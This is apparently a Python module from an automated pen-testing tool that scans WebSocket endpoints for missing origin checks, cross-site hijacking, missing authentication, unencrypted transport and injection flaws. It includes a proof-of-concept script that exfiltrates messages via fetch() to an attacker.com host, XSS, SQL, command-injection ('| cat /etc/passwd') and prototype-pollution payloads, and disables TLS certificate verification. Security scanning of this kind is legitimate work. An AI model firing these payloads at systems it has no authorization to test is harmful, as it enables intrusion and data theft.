"""
Jarwis AGI Pen Test - WebSocket Security Scanner
Detects WebSocket vulnerabilities (A01:2021 - Broken Access Control)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
import json
import time
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, urlunparse
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class WebSocketScanner:
    """
    Scans for WebSocket security vulnerabilities
    OWASP A01:2021 - Broken Access Control
    
    Attack vectors:
    - Cross-Site WebSocket Hijacking (CSWSH)
    - Missing Origin validation
    - Missing authentication
    - Injection attacks
    - Insecure transport (ws:// vs wss://)
    - Rate limiting bypass
    - Message manipulation
    """
    
    # Common WebSocket endpoints
    WS_ENDPOINTS = [
        '/ws',
        '/socket',
        '/websocket',
        '/socket.io/',
        '/sockjs/',
        '/realtime',
        '/live',
        '/stream',
        '/chat',
        '/api/ws',
        '/api/websocket',
        '/ws/connect',
        '/hub',
        '/signalr/',
        '/cable',
        '/push',
        '/notifications',
        '/events',
    ]
    
    # Socket.IO paths
    SOCKETIO_PATHS = [
        '/socket.io/?EIO=4&transport=polling',
        '/socket.io/?EIO=3&transport=polling',
        '/socket.io/?EIO=4&transport=websocket',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.ws_endpoints: List[str] = []
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting WebSocket Security scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        # Convert HTTP to WS URL
        parsed = urlparse(base_url)
        ws_scheme = 'wss' if parsed.scheme == 'https' else 'ws'
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Discover WebSocket endpoints
            await self._discover_websockets(session, base_url)
            
            # Test each endpoint
            for ws_url in self.ws_endpoints:
                await self._test_origin_validation(session, ws_url, base_url)
                await self._test_cswsh(session, ws_url, base_url)
                await self._test_insecure_transport(ws_url)
                await self._test_authentication(session, ws_url)
                await self._test_injection(session, ws_url)
        
        logger.info(f"WebSocket scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    def _http_to_ws(self, url: str) -> str:
        """Convert HTTP URL to WebSocket URL"""
        parsed = urlparse(url)
        ws_scheme = 'wss' if parsed.scheme == 'https' else 'ws'
        return urlunparse((ws_scheme, parsed.netloc, parsed.path, '', parsed.query, ''))
    
    async def _discover_websockets(self, session: aiohttp.ClientSession, base_url: str):
        """Discover WebSocket endpoints"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        for endpoint in self.WS_ENDPOINTS:
            url = urljoin(base_url, endpoint)
            
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                # Check if endpoint responds to upgrade request
                upgrade_headers = {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                async with session.get(url, headers=upgrade_headers) as response:
                    if response.status == 101:
                        # WebSocket upgrade accepted
                        ws_url = self._http_to_ws(url)
                        self.ws_endpoints.append(ws_url)
                    elif response.status == 400:
                        # Might be WebSocket but needs proper handshake
                        upgrade_header = response.headers.get('Upgrade', '').lower()
                        if 'websocket' in upgrade_header:
                            ws_url = self._http_to_ws(url)
                            self.ws_endpoints.append(ws_url)
                    elif response.status == 426:
                        # Upgrade Required - WebSocket endpoint
                        ws_url = self._http_to_ws(url)
                        self.ws_endpoints.append(ws_url)
                        
            except Exception as e:
                logger.debug(f"Error checking {url}: {e}")
        
        # Check Socket.IO endpoints
        for endpoint in self.SOCKETIO_PATHS:
            url = urljoin(base_url, endpoint)
            try:
                await asyncio.sleep(1 / self.rate_limit)
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        body = await response.text()
                        if 'sid' in body or 'socket.io' in body.lower():
                            ws_url = self._http_to_ws(url.replace('transport=polling', 'transport=websocket'))
                            self.ws_endpoints.append(ws_url)
                            
            except Exception:
                pass
        
        # Check discovered endpoints from context
        if hasattr(self.context, 'endpoints'):
            for endpoint in self.context.endpoints:
                url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                if any(ws in url.lower() for ws in ['websocket', 'socket', '/ws', 'signalr']):
                    ws_url = self._http_to_ws(url)
                    if ws_url not in self.ws_endpoints:
                        self.ws_endpoints.append(ws_url)
        
        # Remove duplicates
        self.ws_endpoints = list(set(self.ws_endpoints))
        logger.info(f"Discovered {len(self.ws_endpoints)} WebSocket endpoints")
    
    async def _test_origin_validation(self, session: aiohttp.ClientSession, ws_url: str, base_url: str):
        """Test if WebSocket validates Origin header"""
        parsed = urlparse(base_url)
        
        # Test origins
        malicious_origins = [
            'https://evil.com',
            'https://attacker.com',
            f'https://{parsed.netloc}.evil.com',
            'null',
            '',
            'file://',
        ]
        
        for origin in malicious_origins:
            try:
                # We can't use aiohttp's ws_connect easily with custom origins
                # So we test via HTTP upgrade request
                http_url = ws_url.replace('wss://', 'https://').replace('ws://', 'http://')
                
                headers = {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                    'Origin': origin,
                    'User-Agent': 'Mozilla/5.0'
                }
                
                await asyncio.sleep(1 / self.rate_limit)
                async with session.get(http_url, headers=headers) as response:
                    if response.status == 101:
                        result = ScanResult(
                            id=f"WS-ORIGIN-{len(self.results)+1}",
                            category="A01:2021 - Broken Access Control",
                            severity="high",
                            title="WebSocket Missing Origin Validation",
                            description=f"WebSocket accepts connections from arbitrary origins. Cross-Site WebSocket Hijacking possible.",
                            url=ws_url,
                            method="WebSocket",
                            parameter="Origin",
                            evidence=f"Accepted connection from origin: {origin}",
                            remediation="Validate Origin header against whitelist of allowed origins.",
                            cwe_id="CWE-346",
                            poc=f"Origin: {origin}",
                            reasoning="Server accepted WebSocket connection from malicious origin"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"Origin test error: {e}")
    
    async def _test_cswsh(self, session: aiohttp.ClientSession, ws_url: str, base_url: str):
        """Test for Cross-Site WebSocket Hijacking"""
        # CSWSH is possible when:
        # 1. No origin validation
        # 2. Auth via cookies only (no token required)
        
        http_url = ws_url.replace('wss://', 'https://').replace('ws://', 'http://')
        
        # Test connection without any auth headers but with cookies
        headers = {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version': '13',
            'Origin': 'https://attacker.com',
            'User-Agent': 'Mozilla/5.0'
        }
        
        # Add cookies from context if available
        cookies = {}
        if hasattr(self.context, 'cookies'):
            cookies = self.context.cookies
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            async with session.get(http_url, headers=headers, cookies=cookies) as response:
                if response.status == 101:
                    result = ScanResult(
                        id=f"WS-CSWSH-{len(self.results)+1}",
                        category="A01:2021 - Broken Access Control",
                        severity="critical",
                        title="Cross-Site WebSocket Hijacking (CSWSH)",
                        description="WebSocket endpoint is vulnerable to Cross-Site WebSocket Hijacking. Attacker can hijack authenticated WebSocket connections.",
                        url=ws_url,
                        method="WebSocket",
                        evidence="Connection accepted from cross-origin with cookie auth",
                        remediation="Implement CSRF tokens for WebSocket connections. Validate Origin header strictly.",
                        cwe_id="CWE-352",
                        poc=f"""
<script>
var ws = new WebSocket("{ws_url}");
ws.onmessage = function(e) {{ 
    fetch("https://attacker.com/steal?data=" + btoa(e.data)); 
}};
</script>""",
                        reasoning="WebSocket accepts cross-origin connection with cookie-based auth"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"CSWSH test error: {e}")
    
    async def _test_insecure_transport(self, ws_url: str):
        """Test for insecure WebSocket transport"""
        if ws_url.startswith('ws://'):
            result = ScanResult(
                id=f"WS-INSECURE-{len(self.results)+1}",
                category="A02:2021 - Cryptographic Failures",
                severity="medium",
                title="Insecure WebSocket Transport (ws://)",
                description="WebSocket uses unencrypted ws:// instead of wss://. Traffic can be intercepted.",
                url=ws_url,
                method="WebSocket",
                evidence="Using ws:// instead of wss://",
                remediation="Use wss:// for all WebSocket connections.",
                cwe_id="CWE-319",
                reasoning="WebSocket connection not using TLS"
            )
            self.results.append(result)
    
    async def _test_authentication(self, session: aiohttp.ClientSession, ws_url: str):
        """Test if WebSocket requires authentication"""
        http_url = ws_url.replace('wss://', 'https://').replace('ws://', 'http://')
        
        # Try connecting without any auth
        headers = {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version': '13',
            'User-Agent': 'Mozilla/5.0'
        }
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            async with session.get(http_url, headers=headers) as response:
                if response.status == 101:
                    # Connection accepted without auth
                    result = ScanResult(
                        id=f"WS-NOAUTH-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="medium",
                        title="WebSocket Missing Authentication",
                        description="WebSocket endpoint accepts connections without authentication.",
                        url=ws_url,
                        method="WebSocket",
                        evidence="Connection accepted without authentication headers",
                        remediation="Require authentication for WebSocket connections.",
                        cwe_id="CWE-287",
                        reasoning="WebSocket connection established without credentials"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"Auth test error: {e}")
    
    async def _test_injection(self, session: aiohttp.ClientSession, ws_url: str):
        """Test for injection vulnerabilities via WebSocket"""
        # This requires actual WebSocket connection
        # For now, we'll document the potential vulnerability
        
        injection_payloads = [
            # XSS
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            
            # SQL Injection
            "'; DROP TABLE users;--",
            "1' OR '1'='1",
            
            # Command Injection
            '; ls -la',
            '| cat /etc/passwd',
            
            # JSON manipulation
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
        ]
        
        # Try to connect and send payloads
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=self.ssl_context)) as ws_session:
                try:
                    async with ws_session.ws_connect(ws_url, timeout=self.timeout) as ws:
                        for payload in injection_payloads[:5]:
                            try:
                                await ws.send_str(payload)
                                
                                # Wait for response
                                try:
                                    msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                    if msg.type == aiohttp.WSMsgType.TEXT:
                                        response = msg.data
                                        
                                        # Check for error messages that might indicate vulnerability
                                        error_indicators = ['error', 'exception', 'sql', 'syntax', 'undefined']
                                        if any(e in response.lower() for e in error_indicators):
                                            result = ScanResult(
                                                id=f"WS-INJ-{len(self.results)+1}",
                                                category="A03:2021 - Injection",
                                                severity="high",
                                                title="Potential WebSocket Injection",
                                                description="WebSocket message with injection payload caused error response.",
                                                url=ws_url,
                                                method="WebSocket",
                                                parameter="message",
                                                evidence=f"Response: {response[:200]}",
                                                remediation="Validate and sanitize all WebSocket messages.",
                                                cwe_id="CWE-74",
                                                poc=payload,
                                                reasoning="Injection payload triggered error in WebSocket handler"
                                            )
                                            self.results.append(result)
                                            return
                                            
                                except asyncio.TimeoutError:
                                    pass
                                    
                            except Exception:
                                pass
                                
                except Exception as e:
                    logger.debug(f"WebSocket connection error: {e}")
                    
        except Exception as e:
            logger.debug(f"WebSocket test error: {e}")
